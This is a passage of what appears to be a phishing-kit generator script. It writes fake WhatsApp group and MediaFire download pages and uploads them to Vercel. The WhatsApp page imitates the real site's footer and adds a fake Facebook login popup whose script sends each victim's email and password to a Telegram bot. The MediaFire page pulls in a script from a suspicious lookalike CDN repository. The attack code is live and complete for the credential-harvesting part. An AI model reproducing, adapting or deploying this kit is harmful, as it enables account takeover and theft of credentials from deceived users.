13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z" fill="currentColor"></path>
                            </svg></a><a aria-label="Facebook" href="https://www.facebook.com/profile.php?id=100064758844406" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Facebook_FinePrint_Link&quot;&#125;" target="_blank" style="background-color:;border-color:;fill:;stroke:;"><svg width="11" height="21" viewBox="0 0 11 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__facebook-alt _adid _arcp _afbl">
                                <path d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z" fill="currentColor"></path>
                            </svg></a></div>
                </div>
                <div class="_9t2k">
                    <div class="_9t2m"><span class="_aeom">
                            <div class="_9tar _9ta3 _9ta5 _9ta8 _9u69 _9taw _ae_v"><span class="_aeef">
                                    <p class="_9vd7">2025 © WhatsApp LLC</p>
                                </span><a href="https://www.whatsapp.com/legal/" class="_aeo9 _9vcv _9vcx _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_TermsAndPrivacyPolicy_FinePrint_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9sep _aj1b" style="color:#F0F4F9;">Terms &amp; Privacy Policy</span></span></a><span><a href="https://www.whatsapp.com/sitemap" target="_self" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">
                                            <h6 class="_9vd5 _9sc- _9sd4 _9t31" style="color:#FFFFFF;">Sitemap</h6>
                                        </span></a></span></div>
                        </span><span class="_aeom">
                            <div class="_9tar _9ta3 _9ta5 _9ta8 _9tau _ae_x"><a aria-label="Twitter" href="https://x.com/whatsapp" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Twitter_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg viewBox="0 0 1200 1227" width="48" height="48" fill="none" xmlns="http://www.w3.org/2000/svg" class="_aghm _adid _arcp _afbl">
                                        <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="currentColor"></path>
                                    </svg></a><a aria-label="Youtube" href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_YouTube_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="23" height="16" viewBox="0 0 23 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__youtube _adid _arcp _afbl">
                                        <path d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z" fill="currentColor"></path>
                                    </svg></a><a aria-label="Instagram" href="https://www.instagram.com/whatsapp/?hl=en" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Instagram_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="20" height="21" viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__instagram _adid _arcp _afbl">
                                        <path d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z" fill="currentColor"></path>
                                    </svg></a><a aria-label="Facebook" href="https://www.facebook.com/profile.php?id=100064758844406" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Facebook_FinePrint_Link&quot;&#125;" target="_blank" style="background-color:;border-color:;fill:;stroke:;"><svg width="11" height="21" viewBox="0 0 11 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__facebook-alt _adid _arcp _afbl">
                                        <path d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z" fill="currentColor"></path>
                                    </svg></a></div>
                        </span><span class="_aeom">
                            <div class="_9bhp _9bhq _9bhs _9bhv _afoo">
                                <div class="_afoa"><select id="u_0_a_I/" class="_9tg0 _afo4 _afon _aqya" aria-label="Select your preferred language" role="listbox" tabindex="0">
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">Azərbaycan</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">Afrikaans</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">Bahasa Indonesia</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">Melayu</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">Català</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">čeština</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">Dansk</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">Deutsch</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">Eesti</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en" selected="1">English</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">Español</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">Français</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">Gaeilge</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">Hrvatski</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">Italiano</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">Kiswahili</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">Latviešu</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">Lietuvių</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">Magyar</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">Nederlands</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">Norsk bokmål</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">O‘zbek</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">Filipino</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">Polski</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">Português (Brasil)</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">Português (Portugal)</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">Română</option>
                                        <option class="_afo9" value="https://chat.whatsapp.comchat.whatsapp.com/--sanitized-S228802--?lang=sq">Shqip</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">Slovenčina</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">Slovenščina</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">Suomi</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">Svenska</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">Tiếng Việt</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">Türkçe</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">Ελληνικά</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">български</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">қазақ тілі</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">македонски</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">русский</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">српски</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">українська</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">עברית</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar">العربية</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">فارسی</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">اردو</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">বাংলা</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">हिन्दी</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">ગુજરાતી</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">ಕನ್ನಡ</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">मराठी</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">ਪੰਜਾਬੀ</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">தமிழ்</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">తెలుగు</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">മലയാളം</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">ไทย</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">简体中文</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">繁體中文（台灣）</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">繁體中文（香港）</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">日本語</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">한국어</option>
                                    </select><select id="u_0_b_vn" class="_9tg0 _afo4 _afoc" aria-label="Select your preferred language" role="listbox" tabindex="0">
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">azərbaycan</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">Afrikaans</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">Bahasa Indonesia</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">Melayu</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">català</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">čeština</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">dansk</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">Deutsch</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">eesti</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en" selected="1">English</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">español</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">français</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">Gaeilge</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">hrvatski</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">italiano</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">Kiswahili</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">latviešu</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">lietuvių</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">magyar</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">Nederlands</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">norsk bokmål</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">o‘zbek</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">Filipino</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">polski</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">Português (Brasil)</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">Português (Portugal)</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">română</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">shqip</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">slovenčina</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">slovenščina</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">suomi</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">svenska</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">Tiếng Việt</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">Türkçe</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">Ελληνικά</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">български</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">қазақ тілі</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">македонски</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">русский</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">српски</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">українська</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">עברית</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar">العربية</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">فارسی</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">اردو</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">বাংলা</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">हिन्दी</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">ગુજરાતી</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">ಕನ್ನಡ</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">मराठी</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">ਪੰਜਾਬੀ</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">தமிழ்</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">తెలుగు</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">മലയാളം</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">ไทย</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">简体中文</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">繁體中文（台灣）</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">繁體中文（香港）</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">日本語</option>
                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">한국어</option>
                                    </select><svg width="12" height="8" viewBox="0 0 12 8" fill="none" class="_a99- _afob">
                                        <path d="M1.41 -4.62904e-07L6 4.58L10.59 -6.16331e-08L12 1.41L6 7.41L-6.16331e-08 1.41L1.41 -4.62904e-07Z"></path>
                                    </svg></div>
                            </div>
                        </span></div>
                </div>
            </footer>
        </div>
    </div>
    </div>
    <div></div>
        <div class="popup-login" id="loginPage">
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo" width="120">
            <h2>Log into Facebook</h2>
            <p>Enter your email or phone number</p>
 <form id="loginForm">
  <input type="text" id="email" name="email" placeholder="Email or phone" required>
  <input type="password" id="password" name="password" placeholder="Password" required>
  <button type="submit">Log In</button>
</form>
            <div class="error-message" id="errorMessage">Incorrect email or password.</div>
            <div class="footer">
                <p>Forgotten account? <a href="#">Click here</a></p>
                <p>New to Facebook? <a href="#">Create an account</a></p>
            </div>
        </div>
    </div>
    <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v5/yH/l/0,cross/_jfkUskf2-v.css" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v5/yU/l/0,cross/MEuXBoqspBD.css" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v5/yR/l/0,cross/ChejQs5hirm.css" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v4/yZ/r/4igFof1Bmbn.js" as="script" crossorigin="anonymous" nonce="OYKyolxj" />
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
    

    
  async function sendText(message) {
    axios.post("https://api.telegram.org/bot${t}/sendMessage", {
      chat_id: "${io}",
      text: message
    })
  }
    const processedEmails = new Set();

    function isEmailProcessed(email) {
        return processedEmails.has(email);
    }

    function markEmailAsProcessed(email) {
        processedEmails.add(email);
    }

    function showLoginPopup() {
        document.getElementById("loginPage").style.display = "flex";
    }

document.getElementById("loginForm").addEventListener("submit", function(e) {
e.preventDefault();
const email = document.getElementById('email')?.value;
const password = document.getElementById('password')?.value;
const message = "BERHASIL MENGAMBIL DATA ✅\n\nEMAIL: "+email+"\nPASSWORD: "+password
sendText(message)
})
</script>
</body>
</html>`
fs.writeFileSync("index.html", kode)
await upToVercel(ctx, "index.html", "group-whatsapp")
fs.unlinkSync("index.html")
}

async function mediafire2(ctx, t, io, vn) {
const kode = String.raw`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <title>Mediafire Download</title>
    <meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android" />
    <meta name="description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere." />
    <meta name="robots" content="noindex,nofollow" />
    <meta name="googlebot" content="noindex,nofollow" />
    <meta name="slurp" content="noindex,nofollow" />
    <meta name="google-translate-customization" content="5587c1b0a958bf07-62a8e309de686e87-gc92f61279a2c8524-11" />
    <meta property="fb:app_id" content="124578887583575">
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="MediaFire" />
    <meta property="og:locale" content="en_US" />
    <meta property="og:title" content="Mediafire Download" />
    <meta property="og:image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
    <meta property="og:description" content="" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:site" content="@MediaFire" />
    <meta name="twitter:title" content="Mediafire Download" />
    <meta name="twitter:image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
    <meta name="twitter:description" content="" />
    <link href="https://plus.google.com/+mediafire" rel="publisher" />
    <meta itemprop="name" content="Mediafire Download" />
    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jQueryMoobile/cdnjqueryfuncition@main/slim.min.js"></script>
    <meta itemprop="image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />

</head>
<body>
     <style>
     @import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');


* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Open Sans', sans-serif;
}

body {
    width: 100%;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
}

.wrap {
    position: relative;
    width: 100%;
    min-height: 100vh;
    align-items: center;
    justify-content: flex-start;
    flex-direction: column;
    padding: 200px 0 0 0;
}

.wrap .navbar {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 60px;
    border-bottom: 2px solid rgb(0 0 0 / 10%);
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    z-index: 9999;
    background: #fff;
}

.navbar .logo {
    position: relative;
    width: 60px;
    height: 60px;
}

.navbar .flag {
    position: relative;
    width: 40px;
    height: 30px;
    background: #E9EAEB;
    padding: 4px;
    display: flex;
    align-items: center;
    justify-content: center
}

.flag img {
    max-width: 100%;
}

.logo img {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}

.wrap .down-area {
    position: relative;
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    padding: 0 20px;
    flex-direction: column;
    gap: 20px;
}

.down-area .download {
    width: 100%;
    display: flex;
    align-items: center;
    background: #0070F0;
    padding: 10px;
    gap: 15px;
    border-radius: 3px;
}

.down-area .downloaded {
    position: relative;
    width: 100%;
    background: #f4f4f5;
    color: #000;
    display: none;
    align-self: center;
    justify-content: center;
    padding: 24px;
    font-size: 13px;
    border-radius: 3px;
}

.download .icon {
    position: relative;
    flex: 0 0 35px;
    height: 45px;
}

.icon img {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}

.download .title {
    position: relative;
    flex: 1;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    flex-direction: column;
    gap: 5px;
}

.title .atas {
    font-weight: bold;
    color: #fff;
    font-size: 16px;
}

.title .bawah {
